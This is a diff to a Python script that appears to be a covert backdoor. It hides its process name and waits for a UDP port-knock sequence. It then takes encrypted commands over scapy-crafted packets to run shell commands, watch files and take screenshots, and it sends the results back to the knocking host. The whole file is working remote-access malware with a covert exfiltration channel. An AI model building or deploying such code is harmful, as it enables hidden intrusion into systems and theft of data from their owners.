@@ -1,17 +1,17 @@
 #!/usr/bin/python
-import logging, setproctitle, triplesec, encryption, configfile, helpers, os, sys
+import setproctitle, encryption, configfile, helpers, os, sys, logging
+from multiprocessing import Process
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
 from watchdog.observers import Observer
 from fileWatch import FileWatch
+import pyscreenshot as ImageGrab
 
 state = 0
-ports = [1000, 2000, 3000]
-password = 'abcdefyoyo'
-maxPort = 65535
 observer = Observer()
 watch= ''
+clientIP = ""
 # unauthClients = {}
 # authedClients = {}
 
@@ -37,10 +37,12 @@ def maskProcess():
 
 def knock(packet):
     global state
+    global clientIP
     knocks = configfile.knock
     if IP in packet:
         if UDP in packet:
             ip = packet[IP].src
+            # print ip
             if packet[UDP].sport == knocks[0]  and state == 0:
                 state = 1
                 print packet[IP].src + " state 1"
@@ -49,6 +51,7 @@ def knock(packet):
                 print packet[IP].src + " state 2"
             elif packet[UDP].sport == knocks[2] and state == 2:
                 state = 3
+                clientIP = packet[IP].src
                 print packet[IP].src + " state 3"
             else:
                 print "Wrong sequence, state = 0"
@@ -65,27 +68,21 @@ def shellCommand(packet, command):
     for index, chunk in enumerate(encryptedData):
         if len(chunk) == 2:
             pairs = list(chunk)
-            packet = helpers.createPacketTwo(configfile.protocol, ip, pairs[0], pairs[1])
+            packet = helpers.createPacketTwo(configfile.protocol, ip, pairs[0], pairs[1], 8000)
         elif len(chunk) == 1:
-            packet = helpers.createPacketOne(configfile.protocol, ip, chunk)
+            packet = helpers.createPacketOne(configfile.protocol, ip, chunk, 8000)
         if index == lastIndex:
             packet = packet/Raw(load=configfile.password)
-        send(packet)
+        send(packet, verbose=0)
         time.sleep(0.1)
 
-    # helpers.sendMessage(encryptedData
-    #                    , configfile.password
-    #                    , configfile.protocol
-    #                    , ip
-    #                    , 8000)
-    
-
 def watchAdd(path, ip):
-    watch = observer.schedule(FileWatch(ip,configfile.protocol, configfile.password), path)
+    watch = observer.schedule(FileWatch(ip,configfile.protocol, configfile.password, configfile.masterkey), path)
     observer.start()
-    message = configfile.password + "Watch added"
-    encrptedMessage = encryption.encrypt(message, configfile.password)
-    helpers.sendMessage(encrptedMessage
+    message = "Watch added"
+    time.sleep(1)
+    encryptedMessage = encryption.encrypt(message, configfile.masterkey)
+    helpers.sendMessage(encryptedMessage
                        , configfile. password
                        , configfile.protocol
                        , ip
@@ -99,7 +96,7 @@ def watchAdd(path, ip):
 def watchRemove():
     observer.unschedule(watch)
 
-def screenshot():
+def screenshot(packet, command):
     print "screenshot"
 
 def exit():
@@ -107,6 +104,8 @@ def exit():
 
 def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
+        if packet[IP].src != clientIP:
+            return
         encryptedData = packet['Raw'].load
         data = encryption.decrypt(encryptedData, configfile.masterkey)
         if data.startswith(configfile.password):
@@ -115,11 +114,14 @@ def parseCommand(packet):
             if commandType == 'shell':
                 shellCommand(packet, commandString)
             elif commandType == 'watchAdd':
-                watchAdd(commandString, packet[IP].src)
+                fileProcess = Process(target=watchAdd, args=(commandString, packet[IP].src))
+                fileProcess.daemon = True
+                fileProcess.start()
+                print "file process started"
             elif commandType == 'watchRemove':
                 watchRemove()
             elif commandType == 'screenshot':
-                screenshot()
+                screenshot(packet, commandString)
             elif commandType == 'exit':
                 exit()
             else:
@@ -127,9 +129,10 @@ def parseCommand(packet):
                 print "Unknown command"
 
 def main():
+    maskProcess()
     checkRoot()
     while state is not 3:
-        sniff(filter='udp', prn=knock, count=1)
+        sniff(filter='udp and dst port 7000', prn=knock, count=1)
     while True:
         sniff(filter="dst port 8000", count=1, prn=parseCommand)
 
